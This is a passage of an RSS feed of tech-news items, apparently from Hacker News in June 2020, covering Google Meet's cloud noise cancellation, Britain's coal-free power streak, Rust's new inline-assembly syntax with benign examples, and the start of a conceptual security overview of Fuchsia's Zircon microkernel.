&lt;p&gt;“Manipulating media in the cloud, just five, six, seven years ago could add 200 milliseconds delay, 300 milliseconds delay,” Lachapelle said. “Our job has always been passing through the cloud as quickly as possible. But now with these &lt;a href=&quot;https://venturebeat.com/2017/04/05/google-opens-up-about-its-tpu-chips-for-ai/&quot;&gt;TensorFlow processors&lt;/a&gt;, and basically the way that our infrastructure is built, we discovered that we could do media manipulation in real time and add sometimes only around 20 milliseconds of delay. So that’s the road we took.”&lt;/p&gt;
&lt;p&gt;Google did consider using the edge — putting the machine learning model on the actual device, say in the Google Meet app for Android and iOS.&lt;/p&gt;
&lt;p&gt;“Of course we thought of it,” Lachapelle said. “But we decided that we wanted to have a more consistent experience across devices. Let’s say that I have an advanced i9 processor and then I get to use [noise cancellation]. But then if I move to my laptop that only has an i3 processor, my voice is so much worse. And so we really tried to see how can we bring this to a large group of people in a consistent way. It’s been about the consistency of the experience.”&lt;/p&gt;
&lt;p&gt;Google’s decision to use the cloud means you should have the exact same denoised meeting experience on every device. You won’t have to update anything either, not even the Google Meet app on your phone. Noise cancellation will be turned on server-side.&lt;/p&gt;
&lt;p&gt;“We really think it’s going to help out a lot,” Lachapelle said. “I’ve worked on echo cancellation, on cleaning up video artifacts in real time, all these things. And this is the first time we can do our signal processing in the cloud. We’re quite excited about it. I think that this can change a lot of the signal processing paradigms. Whereas it used to be very, very complex math, and math that is often limited by the hardware you have — using machine learning models in the cloud instead of the complex math to achieve the same, or better, results.”&lt;/p&gt;
&lt;h3&gt;Speed and cost&lt;/h3&gt;
&lt;p&gt;In addition to training the model on different types of noise, there was another big technical hurdle to overcome: speed.&lt;/p&gt;
&lt;p&gt;“Doing this without slowing things down is so important because that’s basically what a big chunk of our team does — try to optimize everything for speed, all the time,” Lachapelle said. “We can’t introduce features that slow things down. And so I would say that just optimizing the code so that it becomes as fast as possible is probably more than half of the work. More than creating the model, more than the whole machine learning part. It’s just like optimize, optimize, optimize. That’s been the hardest hurdle.”&lt;/p&gt;
&lt;p&gt;Google seems happy with the latency, but there is also a question of cost. It’s expensive to add an extra processing step for every single attendee in every single meeting hosted in Google Cloud.&lt;/p&gt;
&lt;p&gt;“There’s a cost associated with it,” Lachapelle acknowledged. “Absolutely. But in our modeling, we felt that this just moves the needle so much that this is something we need to do. And it’s a feature that we will be bringing at first to our paying G Suite customers. As we see how much it’s being used and we continue to improve it, hopefully we’ll be able to bring it to a larger and larger group of users.”&lt;/p&gt;
</description>
<pubDate>Tue, 09 Jun 2020 16:29:42 +0000</pubDate>
<dc:creator>theanirudh</dc:creator>
<og:type>article</og:type>
<og:title>Google Meet noise cancellation is rolling out now — here’s how it works</og:title>
<og:description>Google Meet is getting AI-powered noise cancellation for Android, iOS, and the web. Here is how Google built its cloud denoiser and how it works.</og:description>
<og:url>https://venturebeat.com/2020/06/08/google-meet-noise-cancellation-ai-cloud-denoiser-g-suite/</og:url>
<og:image>https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-hero.png?w=1200&amp;strip=all</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://venturebeat.com/2020/06/08/google-meet-noise-cancellation-ai-cloud-denoiser-g-suite/</dc:identifier>
</item>
<item>
<title>Britain has gone two months without burning coal to generate power</title>
<link>https://www.bbc.com/news/science-environment-52973089</link>
<guid isPermaLink="true" >https://www.bbc.com/news/science-environment-52973089</guid>
<description>&lt;figure class=&quot;media-with-caption&quot; readability=&quot;-24&quot;&gt;&lt;div class=&quot;player-with-placeholder&quot; readability=&quot;7&quot;&gt;
            &lt;p&gt;Media playback is unsupported on your device&lt;/p&gt;
      
    &lt;/div&gt;    &lt;figcaption class=&quot;media-with-caption__caption&quot;&gt;&lt;span class=&quot;off-screen&quot;&gt;Media caption&lt;/span&gt;Here are some coal-fired power stations being demolished over the years&lt;/figcaption&gt;&lt;/figure&gt;&lt;p class=&quot;story-body__introduction&quot;&gt;Britain is about to pass a significant landmark - at midnight on Wednesday it will have gone two full months without burning coal to generate power.&lt;/p&gt;&lt;p&gt;A decade ago about 40% of the country's electricity came from coal; coronavirus is part of the story, but far from all. &lt;/p&gt;&lt;p&gt;When Britain went into lockdown, electricity demand plummeted; the National Grid responded by taking power plants off the network.&lt;/p&gt;&lt;p&gt;The four remaining coal-fired plants were among the first to be shut down.&lt;/p&gt;&lt;p&gt;The last coal generator came off the system at midnight on 9 April. No coal has been burnt for electricity since. &lt;/p&gt;&lt;p&gt;The current coal-free period smashes the previous record of 18 days, 6 hours and 10 minutes which was set in June last year.&lt;/p&gt;&lt;p&gt;The figures apply to Britain only, as Northern Ireland is not on the National Grid.&lt;/p&gt;&lt;p&gt;But it reveals just how dramatic the transformation of our energy system has been in the last decade.&lt;/p&gt;&lt;p&gt;That the country does not need to use the fuel that used to be the backbone of the grid is thanks to a massive investment in renewable energy over the last decade.&lt;/p&gt;&lt;p&gt;Two examples illustrate just how much the UK's energy networks have changed.&lt;/p&gt;&lt;p&gt;A decade ago just 3% of the country's electricity came from wind and solar, which many people saw as a costly distraction.&lt;/p&gt;&lt;figure class=&quot;media-with-caption&quot; readability=&quot;-24&quot;&gt;&lt;div class=&quot;player-with-placeholder&quot; readability=&quot;7&quot;&gt;
            &lt;img class=&quot;media-placeholder player-with-placeholder__image narrative-video-placeholder&quot; src=&quot;https://ichef.bbci.co.uk/images/ic/720x405/p08fkljm.jpg&quot;/&gt;&lt;p&gt;Media playback is unsupported on your device&lt;/p&gt;
      
    &lt;/div&gt;    &lt;figcaption class=&quot;media-with-caption__caption&quot;&gt;&lt;span class=&quot;off-screen&quot;&gt;Media caption&lt;/span&gt;Could coronavirus be the environment's big moment?&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;Now the UK has the biggest offshore wind industry in the world, as well as the largest single wind farm, completed off the coast of Yorkshire last year.&lt;/p&gt;&lt;p&gt;At the same time Drax, the country's biggest power plant, has been taking a different path to renewable energy.&lt;/p&gt;&lt;p&gt;The plant, which is also in Yorkshire, generates 5% of the country's electricity.&lt;/p&gt;&lt;p&gt;A decade ago, it was the biggest consumer of coal in the UK but has been switching to compressed wood pellets.&lt;/p&gt;&lt;figure class=&quot;media-landscape has-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
                 &lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;PA Media&lt;/span&gt;
                
            &lt;/span&gt;
            
            &lt;figcaption class=&quot;media-caption&quot;&gt;&lt;span class=&quot;off-screen&quot;&gt;Image caption&lt;/span&gt;
                &lt;span class=&quot;media-caption__text&quot;&gt;
                    Drax power station in Yorkshire has been switching from coal to wood pellets
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;&quot;We here at Drax decided that coal was no longer the future,&quot; explains Will Gardiner, the chief executive of the power group.&lt;/p&gt;&lt;p&gt;&quot;It has been a massive undertaking and then the result of all that is we've reduced our CO2 emissions from more than 20 million tonnes a year to almost zero.&quot;&lt;/p&gt;&lt;p&gt;He says the plant now uses seven million tonnes of pellets sourced from commercial forests in the US a year and says Drax will phase out coal entirely by March next year.&lt;/p&gt;&lt;p&gt;And it is not just coal that is being eclipsed by renewables.&lt;/p&gt;&lt;p&gt;So far this year, renewables have generated more power than all fossil fuels put together.&lt;/p&gt;&lt;p&gt;Breaking it down, renewables were responsible for 37% of electricity supplied to the network versus 35% for fossil fuels. &lt;/p&gt;&lt;p&gt;Nuclear accounted for about 18% and imports for the remaining 10% or so, according to figures from the online environmental journal, Carbon Brief.&lt;/p&gt;&lt;p&gt;&quot;So far this year renewables have generated more electricity than fossil fuels and that's never happened before&quot;, says Dr Simon Evans of Carbon Brief.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;&quot;With gas also in decline, there's a real chance that renewables will overtake fossil fuels in 2020 as a whole.&quot; &lt;/p&gt;&lt;p&gt;Setting the figures for this year context shows just how quickly this turnaround has happened.&lt;/p&gt;&lt;p&gt;The first day when renewable power out-generated fossil fuels was in December 2016.&lt;/p&gt;&lt;p&gt;Before this year, there had been a total of 154 days when the combined power created from renewable sources exceeded those from fossil fuels.&lt;/p&gt;&lt;p&gt;Carbon Brief says that 91 of those days occurred in 2019.&lt;/p&gt;&lt;p&gt;The decline in the role of fossil fuels in general and coal in particular looks set to continue.&lt;/p&gt;&lt;p&gt;The remaining three coal plants in the UK will be shut down within five years. &lt;/p&gt;&lt;p&gt;Then the fuel that sparked the industrial revolution here in Britain almost two centuries ago will be a thing of the past.&lt;/p&gt;&lt;p&gt;Follow Justin &lt;a href=&quot;https://twitter.com/BBCJustinR&quot; class=&quot;story-body__link-external&quot;&gt;on Twitter.&lt;/a&gt;&lt;/p&gt;
            </description>
<pubDate>Tue, 09 Jun 2020 15:09:20 +0000</pubDate>
<dc:creator>willvarfar</dc:creator>
<og:title>Britain goes coal free as fossil fuels edged out</og:title>
<og:type>article</og:type>
<og:description>On Wednesday, Britain will mark two months without burning any coal to generate power.</og:description>
<og:url>https://www.bbc.com/news/science-environment-52973089</og:url>
<og:image>https://ichef.bbci.co.uk/images/ic/1024x576/p08gh02p.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.bbc.com/news/science-environment-52973089</dc:identifier>
</item>
<item>
<title>Pharaoh Ramesses VI Tomb</title>
<link>https://my.matterport.com/show/?m=NeiMEZa9d93</link>
<guid isPermaLink="true" >https://my.matterport.com/show/?m=NeiMEZa9d93</guid>
<description>[unable to retrieve full-text content]
&lt;p&gt;Article URL: &lt;a href=&quot;https://my.matterport.com/show/?m=NeiMEZa9d93&quot;&gt;https://my.matterport.com/show/?m=NeiMEZa9d93&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=23467292&quot;&gt;https://news.ycombinator.com/item?id=23467292&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Points: 278&lt;/p&gt;
&lt;p&gt;# Comments: 66&lt;/p&gt;
</description>
<pubDate>Tue, 09 Jun 2020 15:08:19 +0000</pubDate>
<dc:creator>EndXA</dc:creator>
<og:title>Explore Pharaoh Ramesses  VI Tomb in 3D</og:title>
<og:description>Matterport 3D Showcase</og:description>
<og:type>video</og:type>
<og:url>https://my.matterport.com/show/?m=NeiMEZa9d93</og:url>
<og:image>https://my.matterport.com/api/v2/player/models/NeiMEZa9d93/thumb/</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://my.matterport.com/show/?m=NeiMEZa9d93</dc:identifier>
</item>
<item>
<title>New inline assembly syntax available in Rust nightly</title>
<link>https://blog.rust-lang.org/inside-rust/2020/06/08/new-inline-asm.html</link>
<guid isPermaLink="true" >https://blog.rust-lang.org/inside-rust/2020/06/08/new-inline-asm.html</guid>
<description>&lt;p&gt;In the course of optimization, OS or embedded development, or other kinds of low-level programming, you may sometimes need to write native assembly code for the processor you're running on. &quot;Inline assembly&quot; provides a simple way to integrate some assembly instructions into a Rust program, feeding Rust expressions in as input registers, and getting output directly into Rust variables. We've introduced a new syntax for inline assembly in nightly Rust, and we're seeking feedback on it; we believe this new syntax has a path to stabilization in the future.&lt;/p&gt;
&lt;p&gt;Nightly Rust has had a syntax for &quot;inline assembly&quot; (&lt;code&gt;asm!&lt;/code&gt;) for a long time; however, this syntax just exposed a very raw version of LLVM's assembly construct, with no safeguards to help developers use it. Getting any detail of this syntax even slightly wrong tended to produce an Internal Compiler Error (ICE) rather than the kind of friendly error message you've come to expect from rustc. This syntax was also error-prone for another reason: it looks similar to GCC's inline assembly syntax, but has subtle differences (such as the names in register constraints). This syntax also had little to no hope of being supported on any non-LLVM backend. As a result of all these limitations, the &lt;code&gt;asm!&lt;/code&gt; syntax was highly unlikely to ever graduate from nightly to stable Rust, despite being one of the most requested features.&lt;/p&gt;
&lt;p&gt;In an effort to improve &lt;code&gt;asm!&lt;/code&gt; and bring it to more users, &lt;a href=&quot;https://github.com/Amanieu&quot;&gt;Amanieu d'Antras&lt;/a&gt; designed and implemented a new, friendlier syntax for &lt;code&gt;asm!&lt;/code&gt;. This syntax has had a long road from concept to compiler implementation:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The proposal first started as a &lt;a href=&quot;https://internals.rust-lang.org/t/pre-rfc-2-inline-assembly/11310&quot;&gt;pre-RFC on internals&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Inline assembly became one of the language team's first &lt;a href=&quot;https://github.com/rust-lang/rfcs/blob/master/text/2836-project-asm.md&quot;&gt;project groups&lt;/a&gt;, and iteratively designed RFCs in &lt;a href=&quot;https://github.com/rust-lang/project-inline-asm/&quot;&gt;the project group repository&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rust-lang/rfcs/pull/2873&quot;&gt;RFC 2873&lt;/a&gt; (still under discussion) provides a specification for the syntax and its interaction with the Rust language.&lt;/li&gt;
&lt;li&gt;We &lt;a href=&quot;https://github.com/rust-lang/rust/pull/68404&quot;&gt;renamed the existing &lt;code&gt;asm!&lt;/code&gt; to &lt;code&gt;llvm_asm!&lt;/code&gt;&lt;/a&gt;, so that people currently using inline assembly on nightly can continue to use the existing syntax for now. (We plan to remove this syntax eventually, given its fragile ICE-happy nature, but while evaluating the new syntax we want the old syntax available for comparison and alternatives.)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rust-lang/rust/pull/69171&quot;&gt;PR 69171&lt;/a&gt; (also by Amanieu) implemented the new &lt;code&gt;asm!&lt;/code&gt; syntax in nightly.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Here's an example of using the new inline assembly syntax, to print a message to standard output using a direct &lt;a href=&quot;https://man7.org/linux/man-pages/man2/write.2.html&quot;&gt;&lt;code&gt;write&lt;/code&gt; syscall&lt;/a&gt; on x86-64 Linux:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-rust&quot;&gt;#![feature(asm)]

fn main() {
    let buf = &quot;Hello from asm!\n&quot;;
    let ret: i32;
    unsafe {
        asm!(
            &quot;syscall&quot;,
            in(&quot;rax&quot;) 1, // syscall number
            in(&quot;rdi&quot;) 1, // fd (stdout)
            in(&quot;rsi&quot;) buf.as_ptr(),
            in(&quot;rdx&quot;) buf.len(),
            out(&quot;rcx&quot;) _, // clobbered by syscalls
            out(&quot;r11&quot;) _, // clobbered by syscalls
            lateout(&quot;rax&quot;) ret,
        );
    }
    println!(&quot;write returned: {}&quot;, ret);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;(You can &lt;a href=&quot;https://play.rust-lang.org/?version=nightly&amp;amp;mode=release&amp;amp;edition=2018&amp;amp;gist=e983a5f5cffa51f4320f1176465d3a56&quot;&gt;try this example on the playground&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;The example above specifies the exact inputs, outputs, and clobbers required by the Linux syscall calling convention. You can also provide inputs and outputs via arbitrary registers, and the compiler will select appropriate registers for you. The following example uses &lt;a href=&quot;https://en.wikipedia.org/wiki/Bit_Manipulation_Instruction_Sets&quot;&gt;bit manipulation instructions&lt;/a&gt; to compute the bit numbers of all set bits in a value, and stores them in a slice of memory:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-rust&quot;&gt;#![feature(asm)]

fn main() {
    let mut bits = [0u8; 64];
    for value in 0..=1024u64 {
        let popcnt;
        unsafe {
            asm!(&quot;
                popcnt {popcnt}, {v}
                2:
                blsi rax, {v}
                jz 1f
                xor {v}, rax
                tzcnt rax, rax
                stosb
                jmp 2b
                1:
                &quot;,
                v = inout(reg) value =&amp;gt; _,
                popcnt = out(reg) popcnt,
                out(&quot;rax&quot;) _, // scratch
                inout(&quot;rdi&quot;) bits.as_mut_ptr() =&amp;gt; _,
            );
        }
        println!(&quot;bits of {}: {:?}&quot;, value, &amp;amp;bits[0..popcnt]);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;(You can &lt;a href=&quot;https://play.rust-lang.org/?version=nightly&amp;amp;mode=release&amp;amp;edition=2018&amp;amp;gist=38874735e48aa20289f23f5a3cbeae0c&quot;&gt;try this example on the playground&lt;/a&gt;. Note that this code serves to demonstrate inline assembly, not to demonstrate an efficient implementation of any particular algorithm.)&lt;/p&gt;
&lt;p&gt;Notice that &lt;code&gt;value&lt;/code&gt; and &lt;code&gt;popcnt&lt;/code&gt; have registers selected for them, while &lt;code&gt;bits.as_mut_ptr()&lt;/code&gt; must go in the &lt;code&gt;rdi&lt;/code&gt; register for use with the &lt;code&gt;stosb&lt;/code&gt; instruction.&lt;/p&gt;
&lt;p&gt;Also, note that on x86 platforms, &lt;code&gt;asm!&lt;/code&gt; uses Intel syntax by default; however, you can use AT&amp;amp;T syntax with &lt;code&gt;option(att_syntax)&lt;/code&gt;. You may find this useful when translating existing inline assembly code to the new &lt;code&gt;asm!&lt;/code&gt; syntax.&lt;/p&gt;
&lt;p&gt;For full details on the new &lt;code&gt;asm!&lt;/code&gt; syntax, see &lt;a href=&quot;https://github.com/Amanieu/rfcs/blob/inline-asm/text/0000-inline-asm.md&quot;&gt;RFC 2873&lt;/a&gt;. Please try it out (including translating existing inline assembly to the new syntax), and &lt;a href=&quot;https://github.com/rust-lang/rust/issues/&quot;&gt;report any bugs via the rust issue tracker&lt;/a&gt; with the tag &lt;code&gt;F-asm&lt;/code&gt;. You can also discuss inline assembly by creating a topic on &lt;a href=&quot;https://rust-lang.zulipchat.com/#narrow/stream/216763-project-inline-asm&quot;&gt;the project-inline-asm stream in Zulip&lt;/a&gt;.&lt;/p&gt;
</description>
<pubDate>Tue, 09 Jun 2020 14:10:12 +0000</pubDate>
<dc:creator>dagenix</dc:creator>
<og:title>New inline assembly syntax available in nightly | Inside Rust Blog</og:title>
<og:description>Want to follow along with Rust development? Curious how you might get involved? Take a look!</og:description>
<og:image>https://www.rust-lang.org/static/images/rust-social-wide.jpg</og:image>
<og:type>website</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.rust-lang.org/inside-rust/2020/06/08/new-inline-asm.html</dc:identifier>
</item>
<item>
<title>Playing around with the Fuchsia operating system</title>
<link>https://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html</link>
<guid isPermaLink="true" >https://blog.quarkslab.com/playing-around-with-the-fuchsia-operating-system.html</guid>
<description>&lt;div class=&quot;summary&quot; readability=&quot;7&quot;&gt;
&lt;p class=&quot;first last&quot;&gt;A look at the new Fuchsia Operating System.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;introduction&quot; readability=&quot;19.74358974359&quot;&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;&lt;a class=&quot;reference external&quot; href=&quot;https://fuchsia.dev/&quot;&gt;Fuchsia&lt;/a&gt; is a new operating system developed by Google, targeting the AArch64 and x86_64 architectures. While little is known about the purpose of this OS and where it will be used, it seems plausible that it aims at replacing Android on smartphones and Chrome OS on laptops.&lt;/p&gt;
&lt;p&gt;In the interest of acquiring knowledge on an OS that could possibly run on millions of devices in the future, we decided to give a quick look at Fuchsia, learn about its inner design, security properties, strengths and weaknesses, and find ways to attack it.&lt;/p&gt;
&lt;/div&gt;

&lt;div class=&quot;section&quot; id=&quot;monolithic-kernels-vs-micro-kernels&quot; readability=&quot;73&quot;&gt;
&lt;h2&gt;Monolithic kernels vs. micro kernels&lt;/h2&gt;
&lt;p&gt;The most common form of kernel design today is &lt;strong&gt;monolithic kernels&lt;/strong&gt;. For example, the Linux and BSD kernels are all monolithic, and being based on Linux, the Android and Chrome OS kernels are monolithic as well.&lt;/p&gt;
&lt;p&gt;A monolithic kernel is typically very big, embeds all device drivers and network stacks, has hundreds of syscalls, and simply said provides all system functionalities.&lt;/p&gt;
&lt;p&gt;The inner design of monolithic kernels varies from kernel to kernel, but overall the following internals tend to be common:&lt;/p&gt;
&lt;img alt=&quot;&quot; class=&quot;align-center&quot; src=&quot;https://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/monolithic.png&quot;/&gt;&lt;p&gt;One clear security problem of monolithic kernels is that any vulnerability in an internal system component will affect all of the kernel. Suppose, in the schema above, that the USB driver has an exploitable memory corruption: since the driver runs within the kernel space, an attacker that exploits this vulnerability gains control of all of the kernel.&lt;/p&gt;
&lt;p&gt;Fuchsia is not based on a monolithic kernel, but rather on a &lt;strong&gt;micro kernel&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;A micro kernel is a type of kernel designed to be very small, as its name indicates, implementing only a limited number of core features, such as scheduling, exception handling, memory management, a few device drivers (if needed) and a few syscalls. The rest of the components are moved to userland, and are not part of the kernel.&lt;/p&gt;
&lt;p&gt;Example of micro kernel design:&lt;/p&gt;
&lt;img alt=&quot;&quot; class=&quot;align-center&quot; src=&quot;https://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/micro.png&quot;/&gt;&lt;p&gt;Here the VFS layer, socket layer, networks stacks, file systems and device drivers are moved to userland in dedicated user processes, which communicate between one another via IPCs.&lt;/p&gt;
&lt;p&gt;For example, an FTP client may fetch data from the network and store it in a USB key only by communicating with other userland processes, without any intervention by the kernel. The kernel only ensures privilege separation and isolation of the processes.&lt;/p&gt;
&lt;p&gt;This micro kernel design has interesting security properties. Suppose once again that there is a vulnerability in the USB driver; in this case, an attacker will be able to take control of the USB driver process running in userland (&lt;strong&gt;Sys Process 6&lt;/strong&gt;), but will then be bound to this very process with no opportunity to immediately run with wider privileges, whether they be kernel privileges, or privileges of other processes (the FTP client for instance).&lt;/p&gt;
&lt;p&gt;The attacker must therefore exploit additional vulnerabilities to move laterally, which is a strong security improvement compared to monolithic kernels.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;the-zircon-micro-kernel&quot; readability=&quot;87.736491968197&quot;&gt;
&lt;h2&gt;The Zircon micro kernel&lt;/h2&gt;
&lt;p&gt;Fuchsia's micro kernel is called Zircon. It is written in &lt;tt class=&quot;docutils literal&quot;&gt;C++&lt;/tt&gt;. We describe here some relevant internals of this kernel.&lt;/p&gt;
&lt;div class=&quot;section&quot; id=&quot;components&quot; readability=&quot;44&quot;&gt;
&lt;h3&gt;Components&lt;/h3&gt;
&lt;p&gt;The system is organised in &lt;strong&gt;components&lt;/strong&gt; which run in userland. The network stack, for example, is a component that runs in userland. The USB drivers, too, are components that run in userland.&lt;/p&gt;
&lt;p&gt;The components interact with one another via IPCs, the interfaces of which we won't discuss here.&lt;/p&gt;
&lt;img alt=&quot;&quot; class=&quot;align-center&quot; src=&quot;https://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/components.png&quot;/&gt;&lt;p&gt;There is no strict programming language requirements for components: they can be written in &lt;tt class=&quot;docutils literal&quot;&gt;C++&lt;/tt&gt;, &lt;tt class=&quot;docutils literal&quot;&gt;Rust&lt;/tt&gt;, &lt;tt class=&quot;docutils literal&quot;&gt;Go&lt;/tt&gt;, or other, and interact via IPCs without problems. For example, the USB drivers are written in &lt;tt class=&quot;docutils literal&quot;&gt;C++&lt;/tt&gt;, and the network stack is instead coded in &lt;tt class=&quot;docutils literal&quot;&gt;Rust&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;When it comes to device drivers, they get folded together in processes called &lt;strong&gt;devhosts&lt;/strong&gt;. A devhost is a process that contains several layers of a driver stack. For example:&lt;/p&gt;
&lt;img alt=&quot;&quot; class=&quot;align-center&quot; src=&quot;https://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/devhosts.png&quot;/&gt;&lt;p&gt;There are three devhosts here. The &lt;strong&gt;Devhost Process 3&lt;/strong&gt; for example contains the AHCI driver, the SATA driver, and the &lt;em&gt;MinFS&lt;/em&gt; and &lt;em&gt;BlobFS&lt;/em&gt; file systems. All of these components live within the same process.&lt;/p&gt;
&lt;p&gt;This kind of weakens the segmentation model because now several components are actually part of the same process, so a vulnerability in one component will affect the other components of the process too. However, it appears that devhosts are organized in a way that only a single device stack can be in a process, typically implying that it's not possible to have the USB driver and the SATA driver in the same devhost. Therefore, the benefits of the segmentation model hold.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;process-isolation&quot; readability=&quot;27.055089820359&quot;&gt;
&lt;h3&gt;Process isolation&lt;/h3&gt;
&lt;p&gt;Zircon protects its memory and that of the processes by using the CPU's &lt;em&gt;MMU&lt;/em&gt; (&lt;a class=&quot;reference external&quot; href=&quot;https://en.wikipedia.org/wiki/Memory_management_unit&quot;&gt;Memory Management Unit&lt;/a&gt;), in a manner that is typical of modern OSes: each process has an address space, and this address space is context-switched by Zircon.&lt;/p&gt;
&lt;p&gt;Contrary to other OSes however, the &lt;em&gt;IOMMU&lt;/em&gt; (&lt;a class=&quot;reference external&quot; href=&quot;https://en.wikipedia.org/wiki/Input%E2%80%93output_memory_management_unit&quot;&gt;Input-Output MMU&lt;/a&gt;), plays an important role on Zircon: it is programmed by the kernel so that each devhost process can perform DMA operations only on its own address space and not outside.&lt;/p&gt;
&lt;p&gt;The IOMMU is therefore as important as the MMU to ensure process isolation, because without it, a devhost process could simply perform DMA operations against the kernel pages and overwrite their contents.&lt;/p&gt;
&lt;p&gt;Additionally, on x86, the &lt;em&gt;TSS I/O Bitmap&lt;/em&gt; (&lt;a class=&quot;reference external&quot; href=&quot;https://en.wikipedia.org/wiki/Task_state_segment&quot;&gt;Task State Segment&lt;/a&gt;) is used to limit access to I/O ports, in a way that is not relevant to discuss here.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;namespaces&quot; readability=&quot;40&quot;&gt;
&lt;h3&gt;Namespaces&lt;/h3&gt;
&lt;p&gt;In Fuchsia, there is no &quot;unified&quot; filesystem visible by user processes. Each process has its own virtual filesystem, called a &lt;strong&gt;namespace&lt;/strong&gt;. The namespace contains &lt;strong&gt;objects&lt;/strong&gt;, which can be files, services, devices. These objects are ordered in a hierarchy, and accessible using file paths with the usual POSIX functions such as &lt;tt class=&quot;docutils literal&quot;&gt;open()&lt;/tt&gt;.&lt;/p&gt;
&lt;p&gt;Several paths are of interest. One is the directory &lt;tt class=&quot;docutils literal&quot;&gt;/svc/&lt;/tt&gt;, which contains service objects, for instance &lt;tt class=&quot;docutils literal&quot;&gt;/svc/fuchsia.hardware.usb.device&lt;/tt&gt;; these are typically objects on which IPCs can be performed. That is to say, one component can expose IPCs via a service object in &lt;tt class=&quot;docutils literal&quot;&gt;/svc/&lt;/tt&gt;, and other components can access these IPCs by accessing this service object in their respective namespaces.&lt;/p&gt;
&lt;p&gt;The namespace is created along with the process when it spawns. It is possible to use a &lt;strong&gt;manifest&lt;/strong&gt; file to dictate which paths/objects will be present within the namespace hierarchy, thereby providing a sandboxing mechanism that limits which IPCs a process will be able to access.&lt;/p&gt;
&lt;p&gt;It is to be noted that the notion of namespace lives within the user processes, but not in the kernel. It can be seen as a convenient, easy-to-use interface for developers to handle objects; but the reality is that the kernel has no understanding of the namespace, of its hierarchy, and of its objects. The only thing the kernel is aware of, is &lt;strong&gt;handles&lt;/strong&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;handles&quot; readability=&quot;37&quot;&gt;
&lt;h3&gt;Handles&lt;/h3&gt;
&lt;p&gt;Zircon manages accesses to components via &lt;strong&gt;handles&lt;/strong&gt;, which can be seen as &lt;em&gt;file descriptors&lt;/em&gt; on Unix, or general access tokens.&lt;/p&gt;
&lt;p&gt;Without going into boring details, the objects in the namespace are basically backed by handles, and a &lt;em&gt;path&lt;/em&gt; in the namespace actually corresponds to a handle. Again, the kernel doesn't know anything about the namespaces and their objects, it only knows about handles. Namespaces live in userland and can be seen as big user-friendly wrappers around handles.&lt;/p&gt;
&lt;p&gt;Handles have a &lt;strong&gt;kind&lt;/strong&gt; and a &lt;strong&gt;right&lt;/strong&gt;. The Zircon syscalls, for the vast majority, depend on handles to manage access rights. To access certain classes of syscalls, a handle must be of the right &lt;em&gt;kind&lt;/em&gt;, and to do specific operations with a syscall, the handle must also have the right &lt;em&gt;right&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;It is to be noted that the kernel has no understanding of the notion of &lt;strong&gt;user&lt;/strong&gt;, contrary to Unix systems.&lt;/p&gt;
&lt;p&gt;Everything comes down to the notion of handle, and that's what we are mainly interested in from a security point of view: attackers will typically try to obtain better handles than the ones they have.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;syscalls&quot; readability=&quot;8.9320388349515&quot;&gt;
&lt;h3&gt;Syscalls&lt;/h3&gt;
&lt;p&gt;Although not always up-to-date, the &lt;a class=&quot;reference external&quot; href=&quot;https://fuchsia.dev/fuchsia-src/reference/syscalls&quot;&gt;official documentation&lt;/a&gt; is rather clear, and nothing particular needs to be highlighted. It shows which handles are required to perform which classes of syscalls.&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;section&quot; id=&quot;mitigations-and-security-practices&quot; readability=&quot;31.70350877193&quot;&gt;
&lt;h3&gt;Mitigations and security practices&lt;/h3&gt;
